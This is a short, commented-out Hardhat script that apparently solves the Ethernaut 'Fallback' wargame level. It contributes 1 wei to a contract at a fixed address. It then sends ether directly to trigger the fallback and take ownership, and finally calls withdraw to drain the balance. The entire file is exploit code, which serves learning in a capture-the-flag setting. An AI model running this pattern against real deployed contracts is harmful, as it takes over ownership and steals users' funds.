// import { ethers } from "hardhat";

// const contractAddress = "0x48E79FA74f625E170219091E24910427E1574eF2";
// const contractName = "FallBack";

// const main = async () => {
//   let tx;

//   const [attacker] = await ethers.getSigners();
//   const factory = await ethers.getContractFactory(contractName);
//   const contract = factory.attach(contractAddress);

//   tx = await contract.contribute({ value: 1 });
//   await tx.wait();

//   tx = await attacker.sendTransaction({
//     to: contract.address,
//     value: 1,
//   });

//   await tx.wait();

//   tx = await contract.withdraw();
//   await tx.wait();
// };

// main().catch(error => {
//   console.error(error);
//   process.exit(1);
// });
